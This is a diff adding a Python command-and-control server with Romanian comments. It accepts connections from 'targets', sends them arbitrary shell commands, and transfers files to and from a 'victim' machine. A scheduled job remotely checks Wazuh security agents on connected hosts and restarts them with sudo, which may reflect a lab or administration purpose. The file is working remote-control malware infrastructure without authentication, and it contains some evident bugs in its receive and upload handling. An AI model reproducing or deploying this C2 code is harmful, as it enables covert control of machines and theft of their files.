@@ -1,0 +1,166 @@
+C2:
+
+from datetime import datetime
+import socket
+import json
+import os
+import base64
+import threading
+import logging
+from schedule import every, repeat
+from constants import *
+
+clients = 0
+
+
+def shell(target, ip, command):
+    print(f"shell() {threading.current_thread().name}")
+    def reliable_send(data):
+        """Send data to the client reliably by encoding to JSON."""
+        try:
+            json_data = json.dumps(data)
+            json_data = json_data.encode('utf-8')
+            target.send(json_data)
+        except Exception as e:
+            print("Error while send message to victim", e)
+
+    def reliable_recv():
+        """Receive data from the client reliably by decoding from JSON."""
+        try:
+            data = ""
+            while True:
+                try:
+                    chunk_recv = target.recv(1024).decode()
+                    if not chunk_recv or len(chunk_recv) == 0 or chunk_recv == '':
+                        break
+                    data = data + chunk_recv
+                    return json.loads(data)
+                except ValueError:
+                    continue
+
+
+        except Exception as e:
+            print("Eroare în timpul primirii datelor de la client:", e)
+            return None
+
+    # while True:
+    # command = input("* Shell#-%s: " % str(ip))
+    print(f"Trimit comanda...{threading.current_thread().name}")
+    result = None
+    reliable_send(command)
+
+    if command == 'q':
+        print("COMANDA Q")
+        # break
+    elif command == "exit":
+        print("COMANDA EXIT")
+        target.close()
+        TARGETS.remove(target)
+        IPS.remove(ip)
+        # break
+    elif command.strip().startswith("cd") and len(command.strip()) > 2:
+        print("COMANDA CD")
+        # continue
+    elif command[:8] == "download":  # DOWNLOAD FROM TARGET TO SERVER
+        with open(command[9:], "wb") as file:
+            file_data = reliable_recv()
+            file.write(base64.b64decode(file_data))
+    elif command[:6] == "upload":
+        try:
+            with open(command[7:], "rb") as fin:
+                reliable_send(base64.b64encode(fin.read()))
+        except ValueError:
+            failed = "Failed to upload"
+            reliable_send(base64.b64encode(failed))
+    else:
+        print(f"SUNT IN ELSE {threading.current_thread().name}")
+        result = reliable_recv()
+
+    return result
+
+def listening_for_connection():
+    print("listening_for_connection()")
+    global clients
+    while True:
+        if STOP_THREADS is True:
+            break
+        C2_SOCKET.settimeout(1)
+        try:
+            target, ip = C2_SOCKET.accept()
+            TARGETS.append(target)
+            IPS.append(ip)
+            connection_message = f"[CONNECTED - {datetime.now()}] : {str(TARGETS[clients])} -- {str(IPS[clients])}"
+            print(f"\n{connection_message}\n")
+            logging.info(connection_message)
+            clients += 1
+        except Exception as e:
+            pass
+
+@repeat(every(30).seconds)
+def check_wazuh_agents():
+    print(f"CHECK WAZUH AGENTS AT {datetime.now()} cu threadul {threading.current_thread().name}:")
+    check_wazuh_status = "wazuh systemctl status wazuh-agent"
+    activate_wazuh_agent = "wazuh sudo systemctl start wazuh-agent"
+    prevention_stop_agent_check = "Active: active (running)"
+    length_of_targets = len(TARGETS)
+    i = 0
+    try:
+        while i < length_of_targets:
+            target = TARGETS[i]
+            ip = IPS[i]
+            response = shell(target, ip, check_wazuh_status)
+            print(f"AGENTUL {ip} A RETURNAT RASPUNSUL: {response}\n\n")
+            # Here can be multiple states of wazuh-agent: inactive, failed, activating, reloading, maintenance
+            # I manage classic state of agent : inactive -> active
+            # In some cases agent can be in failed state, but just when is smth wrong configured
+            if prevention_stop_agent_check not in response:
+                print("AGENTUL NU E ACTIV")
+                _ = shell(target, ip, activate_wazuh_agent)
+                response = shell(target, ip, check_wazuh_status)
+
+                print(f"RAPSUNSUL VENIT DE LA SHELL DUPA COMANDA DE ACTIVARE: {response}")
+                if prevention_stop_agent_check not in response:
+                    print("AGENTUL E IN STATUS != ACTIVE/INACTIVE")
+                    # For consistency here should be saved in a database or smth
+                    logging.info("SOMETHING WRONG WITH WAZUH-AGENT - NOT INACTIVE, BUT POSSIBLY FAILED")
+                else:
+                    print("TEORETIC S-A ACTIVAT")
+            i += 1
+
+    except Exception as e:
+        print(f"[!!] Failed to check to all targets: {e}")
+
+def start_server():
+    print("start_server()")
+    C2_SOCKET.bind((SERVER_ADDRESS, SERVER_PORT))
+    C2_SOCKET.listen(5)
+
+    logging.info(f"[SERVER START - {datetime.now()}] : {SERVER_ADDRESS}:{SERVER_PORT}")
+    logging.info("[+] Waiting for targets to connect ... ")
+    print("[+] Waiting for targets to connect ... ")
+
+    listening_thread = threading.Thread(target=listening_for_connection)
+    check_wazuh_thread = threading.Thread(target=check_wazuh_agents)
+
+    listening_thread.start()
+    check_wazuh_thread.start()
+
+
+
+def list_targets():
+    count = 0
+    sessions_ips = {}
+    for ip in IPS:
+        print(f"Session {count} <--> {ip}")
+        sessions_ips[count] = ip
+        count += 1
+    return sessions_ips
+
+
+
+
+def exit_program(listening_thread):
+    for target in TARGETS:
+        target.close()
+    C2_SOCKET.close()
+    listening_thread.join()
